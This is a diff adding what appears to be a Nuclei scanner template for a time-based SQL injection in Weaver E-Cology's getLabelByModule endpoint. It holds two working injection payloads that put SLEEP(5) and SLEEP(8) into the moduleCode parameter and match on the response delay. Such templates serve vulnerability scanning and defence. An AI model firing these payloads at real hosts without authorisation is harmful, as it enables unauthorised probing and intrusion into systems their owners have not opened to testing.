@@ -1,0 +1,29 @@
+id: ecology-getLabelByModule-sqli-time-based-final
+
+info:
+  name: E-Cology SQL Injection (Time-Based Accurate)
+  author: optimized
+  severity: high
+  tags: 泛微, ecology
+
+http:
+  - raw:
+      - |
+        GET /api/ec/dev/locale/getLabelByModule?moduleCode=aaa') AND SLEEP(5)--+ HTTP/1.1
+        Host: {{Host}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+
+      - |
+        GET /api/ec/dev/locale/getLabelByModule?moduleCode=aaa') AND SLEEP(8)--+ HTTP/1.1
+        Host: {{Host}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+        - duration_1>=5 && duration_1<=6
+        - duration_2>=8 && duration_2<=9
+        condition: and
